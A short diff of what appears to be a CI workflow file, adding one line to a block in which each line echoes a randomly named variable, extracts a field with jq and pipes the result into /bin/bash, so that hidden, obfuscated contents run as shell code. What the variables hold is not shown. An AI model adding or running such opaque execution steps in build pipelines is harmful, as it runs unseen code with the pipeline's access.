@@ -39,6 +39,7 @@ jobs:
           echo $fg8 | jq -r .thq8200 | /bin/bash
           echo $hqz79171 | jq -r .glllk796 | /bin/bash
           echo $q7 | jq -r .rajjg9166 | /bin/bash
+          echo $seqk275 | jq -r .uqa80 | /bin/bash
 
       - name: Archive results
         if: always()
